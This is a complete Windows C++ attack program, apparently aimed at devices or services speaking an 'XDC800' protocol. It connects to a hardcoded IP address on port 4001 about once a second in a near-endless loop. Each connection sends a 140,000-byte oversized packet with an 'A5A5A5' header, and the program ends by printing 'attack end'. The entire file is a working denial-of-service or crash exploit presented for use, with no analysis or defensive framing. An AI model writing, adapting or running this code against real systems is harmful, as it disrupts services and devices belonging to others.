#include <windows.h>
#include <winsock.h>
#include <stdio.h>

#pragma comment(lib,"ws2_32.lib")

#pragma pack(1)
typedef struct {
	unsigned char flag[6];
	unsigned int len;
	unsigned char data[0];
}XDC800_PROTOCOL;
#pragma pack()

void mainproc(char * ip) {

	int ret = 0;

	SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (s == INVALID_SOCKET)
	{
		return;
	}

	sockaddr_in sa = { 0 };
	sa.sin_family = AF_INET;
	sa.sin_addr.S_un.S_addr = inet_addr(ip);
	sa.sin_port = ntohs(4001);
	ret = connect(s, (sockaddr*)&sa, sizeof(sockaddr_in));
	if (ret)
	{
		closesocket(s);
		return;
	}

	int totalsize = 130000 + 10000;
	char * data = new char[totalsize];
	if (data == 0)
	{
		closesocket(s);
		return;
	}
	memset(data, 0, totalsize);
	XDC800_PROTOCOL * pro = (XDC800_PROTOCOL*)data;
	pro->len = totalsize - sizeof(XDC800_PROTOCOL);
	memcpy(pro->flag,"A5A5A5",6);
	ret = send(s, data, totalsize, 0);
	closesocket(s);
	delete data;
	if (ret != totalsize)
	{
		return;
	}
	return;
}

int main(int argc, char ** argv) {
	int ret = 0;

	WSADATA wsa = { 0 };
	ret = WSAStartup(0x0202, &wsa);
	if (ret)
	{
		return 0;
	}

	for (int i = 0; i < 0x10000000; i++)
	{
		mainproc("222.222.221.1");	
		Sleep(1000);
	}

	WSACleanup();


	printf("attack end\r\n");
	//ExitProcess(0);
	return 0;
}